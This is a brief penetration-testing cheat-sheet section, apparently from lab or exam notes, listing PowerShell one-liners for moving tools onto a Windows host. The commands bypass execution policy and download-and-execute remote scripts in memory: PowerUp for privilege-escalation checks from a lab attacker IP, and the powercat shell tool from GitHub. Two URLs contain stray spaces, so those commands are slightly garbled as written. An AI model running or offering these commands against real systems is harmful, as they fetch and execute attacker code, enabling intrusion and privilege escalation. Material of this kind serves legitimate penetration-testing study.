### Powershell Transfers

From outside Powershell

```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/ /10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.xxx:8000/powerup.ps1') ; Invoke-AllChecks"
```

Inside Powershell

```
iex (New-Object System.Net.Webclient).DownloadString('https://raw. githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```